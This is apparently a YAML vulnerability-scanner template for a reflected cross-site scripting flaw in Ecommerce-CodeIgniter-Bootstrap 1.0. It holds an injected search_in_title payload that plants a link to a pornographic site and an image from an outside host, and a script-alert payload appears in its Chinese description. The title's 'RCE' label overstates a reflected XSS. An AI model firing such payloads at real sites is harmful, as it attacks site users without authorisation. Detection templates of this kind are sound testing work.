id: Ecommerce-CodeIgniter-Bootstrap-1.0-Cross-site-scripting-RCE

info:
  name: Ecommerce-CodeIgniter-Bootstrap-1.0 Cross-site scripting (reflected) RCE
  author: nu11secur1ty
  severity: critical
  description: 请求参数的值search_in_title被复制到 HTML 标记属性的值中，该属性封装在双引号中。payload f5iun"><script>alert(1)</script>h4s83是在search_in_title参数中提交的。恶意用户可以利用这个漏洞利用这个系统的每个用户，使他们成为bot机器等。
  reference:
    - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/kirilkirkov/Ecommerce-CodeIgniter-Bootstrap

set:
  hosturl: request.url
rules:
  r0:
    request:
      method: GET
      path: /bg?category=&in_stock=&search_in_title=f5iun"><a%20href="https://pornhub.com/"%20target="_blank"%20rel="noopener%20nofollow%20ugc">%20<img%20src="https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif??token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1"%20style="border:1px%20solid%20black;max-width:100%;"%20alt="Photo%20of%20Byron%20Bay,%20one%20of%20Australia%27s%20best%20beaches!">%20</a>h4s83&order_new=&order_price=&order_procurement=&brand_id=&quantity_more=203512&added_after=205226&added_before=989087&search_in_body=167490&price_from=870466&price_to=586592&order_new=&order_price=&order_procurement=&brand_id=&quantity_more=203512&added_after=205226&added_before=989087&search_in_body=167490&price_from=870466&price_to=586592
      headers:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Language: en-US;q=0.9,en;q=0.8
        Referer: "{{hosturl}}/bg?category=&in_stock=&search_in_title=&order_new=&order_price=&order_procurement=&brand_id=&quantity_more=203512&added_after=205226&added_before=989087&search_in_body=167490&price_from=870466&price_to=586592"
    expression: response.status == 200 && response.body.bcontains(b'GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ')
expression: r0()